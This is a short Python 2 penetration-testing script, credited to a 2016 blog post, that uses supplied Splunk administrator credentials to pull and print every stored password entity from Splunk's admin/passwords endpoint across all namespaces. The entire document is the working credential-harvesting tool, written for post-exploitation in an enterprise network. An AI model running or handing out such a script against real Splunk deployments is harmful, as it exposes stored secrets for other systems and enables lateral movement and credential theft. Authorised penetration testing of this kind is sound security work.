# Credit to Kevin Dick at Tevora
# May 16, 2016
# http://threat.tevora.com/penetration-testing-with-splunk-leveraging-splunk-admin-credentials-to-own-the-enterprise/
import getpass
import splunk.auth
import splunk.entity as entity
import splunk.search


def huntpasswords(sessionKey):
    entities = entity.getEntities(['admin', 'passwords'], owner="nobody", namespace="-", sessionKey=sessionKey)
    return entities


def getsessionkeyfromcreds():
    user = raw_input("Username:")
    password = getpass.getpass()
    sessionKey = splunk.auth.getSessionKey(user, password)
    return sessionKey


if __name__ == "__main__":
    sessionKey = getsessionkeyfromcreds()
    print huntpasswords(sessionKey)
